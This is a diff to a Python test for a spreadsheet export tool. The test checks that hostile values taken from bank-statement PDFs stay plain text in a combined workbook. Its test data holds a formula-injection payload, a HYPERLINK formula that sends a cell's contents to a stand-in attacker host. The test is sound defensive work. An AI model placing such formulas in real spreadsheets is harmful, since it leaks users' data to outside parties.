@@ -13,7 +13,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
 from openpyxl import Workbook, load_workbook  # noqa: E402
 
-from main import Formula, store_as_text_unless_formula, write_row, write_row_at  # noqa: E402
+from main import Formula, build_combined_workbook, store_as_text_unless_formula, write_row, write_row_at  # noqa: E402
 
 HOSTILE = [
     '=HYPERLINK("https://attacker.example/?d="&A1,"Click")',
@@ -50,4 +50,14 @@ for column, value in enumerate(LITERAL, start=1):
     assert cell.value == value, f"literal text changed: {value!r} -> {cell.value!r}"
 assert reloaded["A4"].data_type == "s" and reloaded["A4"].value == HOSTILE[0], "a directly assigned title must stay text"
 
-print("formula injection: 3 hostile strings stay text, 4 literals unchanged, 1 intended formula kept")
+# The combined pack's title is built from the company name the PDF supplied.
+run = {"id": "r1", "company_name": HOSTILE[0], "bank": HOSTILE[1], "account_number": HOSTILE[2],
+       "statement_period_start": "2026-01-01", "statement_period_end": "2026-01-31", "created_at": "2026-02-01"}
+combined, _ = build_combined_workbook([run], {"r1": []})
+with zipfile.ZipFile(BytesIO(combined)) as archive:
+    sheets = [name for name in archive.namelist() if name.startswith("xl/worksheets/sheet")]
+    combined_formulas = sum(archive.read(name).decode().count("<f>") for name in sheets)
+assert combined_formulas == 0, f"the combined workbook writes no formulas of its own, found {combined_formulas}"
+assert load_workbook(BytesIO(combined))["Dashboard"]["A1"].data_type == "s", "the combined title must stay text"
+
+print("formula injection: 3 hostile strings stay text, 4 literals unchanged, 1 intended formula kept; combined pack has no formulas")
